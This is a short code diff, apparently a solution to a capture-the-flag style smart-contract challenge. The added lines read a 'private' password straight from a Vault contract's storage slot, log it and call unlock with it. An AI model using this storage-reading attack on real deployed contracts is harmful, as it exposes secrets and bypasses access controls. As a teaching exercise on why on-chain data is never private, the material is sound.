@@ -8,6 +8,9 @@ const helper = async (victim: any) => {
     Unlock the vault by somehow reading the private password from 
     Vault directly
   */
+  const pw = await victim.provider.getStorageAt(victim.address, 1);
+  console.log("password: ", pw);
+  await victim.unlock(pw);
 };
 
 export default helper;
